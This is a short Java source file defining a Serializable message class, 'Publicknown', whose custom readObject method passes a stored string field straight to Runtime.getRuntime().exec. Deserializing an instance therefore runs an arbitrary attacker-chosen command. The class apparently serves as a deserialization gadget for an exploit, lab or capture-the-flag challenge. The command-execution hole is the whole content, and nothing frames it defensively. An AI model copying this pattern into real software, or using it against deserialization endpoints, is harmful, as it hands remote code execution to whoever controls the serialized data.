import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Publicknown extends Message implements Serializable {
    private static final long serialVersionUID = -602616310561173787L;
    private String axin;

    public void setAxin(String axin) {
        this.axin = axin;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(this.axin);
    }
}
